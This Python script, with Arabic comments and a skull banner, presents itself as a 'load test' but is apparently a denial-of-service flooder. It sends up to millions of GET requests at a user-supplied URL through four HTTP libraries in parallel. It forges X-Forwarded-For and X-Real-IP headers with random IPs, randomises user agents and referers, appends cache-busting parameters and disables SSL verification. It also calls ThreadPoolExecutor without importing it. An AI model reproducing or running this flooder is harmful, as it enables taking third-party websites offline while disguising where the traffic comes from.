import requests
import threading
import httpx
import aiohttp
import asyncio
from user_agent import generate_user_agent
from random import randint, choice, uniform
import urllib3
import subprocess
import sys
import os
import time
import logging

# --- إعدادات الألوان والطباعة الأولية ---
Almunharif1 = '\x1b[1;31m'  # أحمر
Almunharif2 = '\x1b[1;32m'  # أخضر
Almunharif_reset = '\x1b[0m' # إعادة ضبط اللون

l=(f'''{Almunharif1}
        ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
      ¶¶¶¶¶¶     🧠       ¶¶¶¶¶¶
     ¶¶¶¶¶                 ¶¶¶¶¶¶
    ¶¶¶¶                     ¶¶¶¶¶
   ¶¶¶¶                       ¶¶¶¶¶
  ¶¶¶¶     ¶¶¶¶       ¶¶¶¶      ¶¶¶
  ¶¶¶     ¶¶🔥¶¶     ¶¶🔥¶¶     ¶¶¶¶
 ¶¶¶¶     ¶¶¶¶¶¶     ¶¶¶¶¶¶      ¶¶¶
 ¶¶¶       ¶¶¶¶       ¶¶¶¶       ¶¶¶¶
 ¶¶¶                              ¶¶¶
 ¶¶¶                              ¶¶¶
 ¶¶¶             🩸🩸              ¶¶¶
 ¶¶¶            ¶¶¶¶¶            ¶¶¶¶
 ¶¶¶¶        ¶¶¶¶¶¶¶¶¶¶¶         ¶¶¶
  ¶¶¶      ¶¶¶¶¶     ¶¶¶¶¶      ¶¶¶¶
  ¶¶¶¶    ¶¶¶           ¶¶¶    ¶¶¶¶
   ¶¶¶¶   ¶¶     🚫       ¶¶   ¶¶¶¶
    ¶¶¶¶                    ¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                
''')
print(l)

# --- التأكد من تثبيت المكتبات المطلوبة ---
required_libraries = [
    "requests",
    "httpx",
    "aiohttp",
    "user_agent",
    "urllib3"
]

def install_and_import(library):
    try:
        __import__(library)
    except ModuleNotFoundError:
        print(f"{Almunharif1}Installing {library}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        print(f"{Almunharif2}{library} installed successfully.{Almunharif_reset}")

for lib in required_libraries:
    install_and_import(lib)

# --- بعد التأكد من التثبيت، قم بالاستيراد مرة أخرى لضمان توفرها ---
import requests
import httpx
import aiohttp
import asyncio
import urllib3
# لا داعي لإعادة استيراد threading, user_agent, random حيث تم استيرادها بالفعل

# --- إعدادات عامة للسكربت ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # تعطيل تحذيرات SSL

# --- مقاييس الأداء والإحصائيات (تُحدّث بواسطة جميع المهام) ---
successful_requests = 0
failed_requests = 0
total_response_time = 0.0
requests_lock = threading.Lock() # قفل لتحديث العدادات بأمان من مهام متعددة

# --- وظيفة توليد IP عشوائي ---
def Almunharif_generate_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

# --- وظيفة توليد رؤوس طلبات متنوعة ---
def Almunharif_generate_diverse_headers():
    user_agent = generate_user_agent()
    random_ip = Almunharif_generate_ip()

    headers = {
        "User-Agent": user_agent,
        "X-Forwarded-For": random_ip,
        "X-Real-IP": random_ip, # إضافة X-Real-IP لتعزيز التزوير
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": choice(["en-US,en;q=0.9", "ar-EG,ar;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9"]),
        "Accept-Encoding": choice(["gzip, deflate, br", "gzip, deflate"]),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache", # طلب عدم استخدام الكاش
        "Pragma": "no-cache", # طلب عدم استخدام الكاش
        "Upgrade-Insecure-Requests": "1" # لمحاكاة متصفح يطلب ترقية الاتصال لـ HTTPS
    }
    # إضافة Referer عشوائيًا (لجعله يبدو أكثر طبيعية)
    if uniform(0, 1) < 0.8: # 80% chance to add a referer
        headers["Referer"] = f"https://www.{''.join(choice('abcdefghijklmnopqrstuvwxyz') for _ in range(randint(5,15)))}.com/"
    return headers

# --- وظيفة تحديث الإحصائيات بأمان ---
def update_stats(is_success, response_time):
    global successful_requests, failed_requests, total_response_time
    with requests_lock:
        if is_success:
            successful_requests += 1
        else:
            failed_requests += 1
        total_response_time += response_time

# --- دوال إرسال الطلبات (Synchronous) ---
def Almunharif_requests_sync(target_url, Almunharif_num_requests):
    Almunharif_session = requests.Session()
    for _ in range(Almunharif_num_requests):
        Almunharif_headers = Almunharif_generate_diverse_headers()
        url_with_param = f"{target_url}?_={time.time()}&rand={randint(1000, 9999)}" # بارامترات عشوائية إضافية لتجاوز الكاش
        start_time = time.time()
        try:
            Almunharif_response = Almunharif_session.get(url_with_param, headers=Almunharif_headers, timeout=10, verify=False) # زيادة المهلة
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}Requests: Sent | Status: {Almunharif_response.status_code} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
            update_stats(Almunharif_response.status_code == 200, response_time)
        except requests.exceptions.RequestException as Almunharif_error:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif1}Requests Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
            update_stats(False, response_time)

def Almunharif_httpx_sync(target_url, Almunharif_num_requests):
    with httpx.Client(verify=False, timeout=10) as Almunharif_client: # زيادة المهلة
        for _ in range(Almunharif_num_requests):
            Almunharif_headers = Almunharif_generate_diverse_headers()
            url_with_param = f"{target_url}?_={time.time()}&rand={randint(1000, 9999)}"
            start_time = time.time()
            try:
                Almunharif_response = Almunharif_client.get(url_with_param, headers=Almunharif_headers)
                response_time = (time.time() - start_time) * 1000
                print(f"{Almunharif2}HTTPX: Sent | Status: {Almunharif_response.status_code} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
                update_stats(Almunharif_response.status_code == 200, response_time)
            except httpx.RequestError as Almunharif_error:
                response_time = (time.time() - start_time) * 1000
                print(f"{Almunharif1}HTTPX Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
                update_stats(False, response_time)

def Almunharif_urllib3_sync(target_url, Almunharif_num_requests):
    Almunharif_http = urllib3.PoolManager(cert_reqs='CERT_NONE', timeout=10) # زيادة المهلة
    for _ in range(Almunharif_num_requests):
        Almunharif_headers = Almunharif_generate_diverse_headers()
        url_with_param = f"{target_url}?_={time.time()}&rand={randint(1000, 9999)}"
        start_time = time.time()
        try:
            Almunharif_response = Almunharif_http.request('GET', url_with_param, headers=Almunharif_headers)
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}URLLIB3: Sent | Status: {Almunharif_response.status} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
            update_stats(Almunharif_response.status == 200, response_time)
        except urllib3.exceptions.RequestError as Almunharif_error:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif1}URLLIB3 Error: {Almunharif_error} | IP: {Almunharif_headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
            update_stats(False, response_time)

# --- دوال إرسال الطلبات (Asynchronous) لـ aiohttp ---
async def Almunharif_aiohttp_async_worker(session, url, headers):
    start_time = time.time()
    try:
        async with session.get(url, headers=headers) as Almunharif_response:
            response_time = (time.time() - start_time) * 1000
            print(f"{Almunharif2}AIOHTTP: Sent | Status: {Almunharif_response.status} | IP: {headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
            update_stats(Almunharif_response.status == 200, response_time)
    except aiohttp.ClientError as Almunharif_error:
        response_time = (time.time() - start_time) * 1000
        print(f"{Almunharif1}AIOHTTP Error: {Almunharif_error} | IP: {headers['X-Forwarded-For']} | Time: {response_time:.2f}ms{Almunharif_reset}")
        update_stats(False, response_time)

async def Almunharif_aiohttp_async_manager(target_url, Almunharif_num_requests):
    Almunharif_connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=Almunharif_connector, timeout=aiohttp.ClientTimeout(total=10)) as Almunharif_session: # زيادة المهلة
        tasks = []
        for _ in range(Almunharif_num_requests):
            Almunharif_headers = Almunharif_generate_diverse_headers()
            url_with_param = f"{target_url}?_={time.time()}&rand={randint(1000, 9999)}"
            tasks.append(Almunharif_aiohttp_async_worker(Almunharif_session, url_with_param, Almunharif_headers))
        # استخدام asyncio.gather لتشغيل كل المهام بالتوازي
        await asyncio.gather(*tasks, return_exceptions=True) # لجمع النتائج حتى لو كانت هناك استثناءات

# --- وظيفة التنسيق الرئيسية لاختبار الإجهاد ---
def Almunharif_stress_test(target_url, Almunharif_total_requests, Almunharif_max_workers):
    # تقسيم الطلبات على عدد المهام الموزعة بين المكتبات
    Almunharif_num_per_library = Almunharif_total_requests // 4
    if Almunharif_num_per_library == 0:
        Almunharif_num_per_library = 1

    Almunharif_threads = [
        threading.Thread(target=Almunharif_requests_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_httpx_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=Almunharif_urllib3_sync, args=(target_url, Almunharif_num_per_library)),
        threading.Thread(target=lambda: asyncio.run(Almunharif_aiohttp_async_manager(target_url, Almunharif_num_per_library)))
    ]

    start_attack_time = time.time()
    # استخدام ThreadPoolExecutor لزيادة عدد المهام المتزامنة في الخلفية
    # هذا يسمح بإطلاق عدد هائل من الطلبات
    with ThreadPoolExecutor(max_workers=Almunharif_max_workers) as executor:
        futures = []
        # كل Thread سيقوم بتشغيل إحدى دوال المكتبات الأربع
        for t in Almunharif_threads:
            futures.append(executor.submit(t.run)) # نمرر دالة run للمهمة

        # ننتظر انتهاء جميع المهام
        for future in futures:
            future.result() # استرداد النتائج لضمان اكتمال المهام ورفع أي استثناءات

    end_attack_time = time.time()
    total_attack_duration = end_attack_time - start_attack_time

    # --- عرض الإحصائيات النهائية بعد انتهاء الاختبار ---
    print("\n" + "="*50)
    print(f"{Almunharif2}Load Test Finished!{Almunharif_reset}")
    total_sent_requests = successful_requests + failed_requests
    print(f"{Almunharif2}Total Requests Sent: {total_sent_requests}{Almunharif_reset}")
    print(f"{Almunharif2}Successful Requests: {successful_requests}{Almunharif_reset}")
    print(f"{Almunharif1}Failed Requests: {failed_requests}{Almunharif_reset}")

    if total_sent_requests > 0:
        avg_response_time = total_response_time / total_sent_requests
        print(f"{Almunharif2}Average Response Time: {avg_response_time:.2f}ms{Almunharif_reset}")
        if total_attack_duration > 0:
            requests_per_second = total_sent_requests / total_attack_duration
            print(f"{Almunharif2}Requests Per Second (RPS): {requests_per_second:.2f}{Almunharif_reset}")
        else:
            print(f"{Almunharif2}Requests Per Second (RPS): N/A (Duration too short){Almunharif_reset}")
    else:
        print(f"{Almunharif2}No requests were sent.{Almunharif_reset}")
    print("="*50)


# --- الجزء الرئيسي لتشغيل السكربت ---
if __name__ == "__main__":
    Almunharif_url = input(f"{Almunharif2}Enter Target URL for Load Test (e.g., https://yourwebsite.com): {Almunharif_reset}")

    Almunharif_total_requests_input = input(f"{Almunharif2}Enter Total Number of Requests (e.g., 10000000 for 10 million, or more for extreme test): {Almunharif_reset}")
    try:
        Almunharif_total_requests = int(Almunharif_total_requests_input)
        if Almunharif_total_requests <= 0:
            raise ValueError
    except ValueError:
        print(f"{Almunharif1}Invalid number of requests. Using default 10,000,000 requests.{Almunharif_reset}")
        Almunharif_total_requests = 10_000_000

    Almunharif_max_workers_input = input(f"{Almunharif2}Enter Max Number of Concurrent Workers (e.g., 500 for high load, 1000+ for extreme load - be cautious with your system resources): {Almunharif_reset}")
    try:
        Almunharif_max_workers = int(Almunharif_max_workers_input)
        if Almunharif_max_workers <= 0:
            raise ValueError
    except ValueError:
        print(f"{Almunharif1}Invalid number of workers. Using default 500 workers.{Almunharif_reset}")
        Almunharif_max_workers = 500

    print(f"\n{Almunharif2}Starting extreme load test on {Almunharif_url} with {Almunharif_total_requests} requests and {Almunharif_max_workers} concurrent workers...{Almunharif_reset}\n")
    Almunharif_stress_test(Almunharif_url, Almunharif_total_requests, Almunharif_max_workers)
            
